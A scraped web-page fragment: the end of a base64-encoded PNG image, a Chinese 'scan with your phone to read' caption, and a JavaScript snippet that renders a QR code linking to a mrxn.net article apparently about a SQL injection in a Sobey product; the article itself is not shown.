fwhoG878X+L6zc/nSSawW+cokr5gWBNYmDYB52TC446xcummB4IbhnckHlYuGC4JpZvuf6OD2E4D7yZdGCeRjfiMCeA/uqrZY+lVs3pJ7GB/htIHCcIjiGHTPRYL//8MKzHIz9em1ieKyFXZM6rS9LPEPY62D3Z1r1qjbThAP3qvr44BwYU1OxDaSSy3/fCQy/GGaa2VJiIXiyYOw1YB7276nRgHPqEwNzYAw/w/TpsWr73FVc66oP3guMryH9wJrEQhi5ysPeL+uBa2DHdUN0ah9k7V1W9gSeVh/DOOF+0qkRgvtEI04G5mHvJ14Gew4Q1QzY/swAxpYoTtYCa/q4SFuvyvU+uA8Yk0/fxMIZJ/7KZjXrhlyd2BtyayBvOPSrJdsPdfC17K9RYmEagbWJZyi9DI5acbHU9XF4cC0Qqv0beiP+OgJg+1Z01k+a2CuaXgteJ72EcOTAcWqFYE56GRxjceuG6BQ+yIYf6ld7A09U05bBMa614Fw46WVgHkZUXpaaiuJllZMPex/lZWBO+WpgHs7xSl9zva91Z1Z1yVeu99cN6U/kzXEbSD+9xLA/TT2XOK8hccXkwH1muWiCVRMfXA/GmRacS000M+w1ia8Q3H/WLxw8r8laqRW2gShY9v4TaAMBTxaOONvibLLSwV6reGawa/o+4FzqwDEQqiGwvaOCHR/1a8XFSQ24T0m95ILr+35gHnbsNYmFbSAvrb7EP3YC7fcQTafa1YqwTxt2v9aD+XBX/ZKLFo614qO5QnAdGKNVvSyxEI4acTIwDyOqRzXpewPX9fwsTi9wDbD+u6zbh32sb1mXA/n95OkvhrlOFbO9yskPP0PwdZROVjXgXDhwLJ0MHAORNFT+zJrorwNsbwD+hgeA81yEWQesBWPywmh6VC6WXOIZrhsyO5U3cu2HOnjq8Dxm35k87LXJBcG5aIXJ9QijVnrZmRboU+0PkaqTVYFiWTj5ssQzVF42y4UDTm/jmUY9Y+uG5JQ+BNtAMqFn8Jm9932uaqKNpo/Fw/zJi1YoXTVwDRiliVWdfHiskU521uNRTnlZ6sFrwo5tIBIue/8JDAOBfVpw9H9qu+B18uQ8sw64BkZM/Sv9XtGC18w6QjAHR1QuBs4lzpoVh4FEvPA9J7AG8p5zP131WwYCvor16oG5rJwcmAeSOkVgewsJ+38ylD6zouSC4PqZFpx7RTvrc8al7ywPXnuW+5aBzBov7msn8C0DuXoasi0Yn4rUBaMNhheC68EorrfU9RgduBb2GwfmUgOOYdekPporjBbc50qbHFgLrL/23j7sY7ghmfAMX9l76sHTT214ITgHjzH1QXBN4orgnNaQJSc/BtbMctEk9ww+UxNNMH0TC4eBRLTwPSfQBgJ+YuAxnm0VxlpNXTarET+zaGe5notWCF4/GnHVwHk4//kAuwbs1x7VzzpCsBaMVXfmw6htAzkrWvzvnsAayO+e98PV/gMAAP//DPW+GAAAAAZJREFUAwB2xYeJj/T1jQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 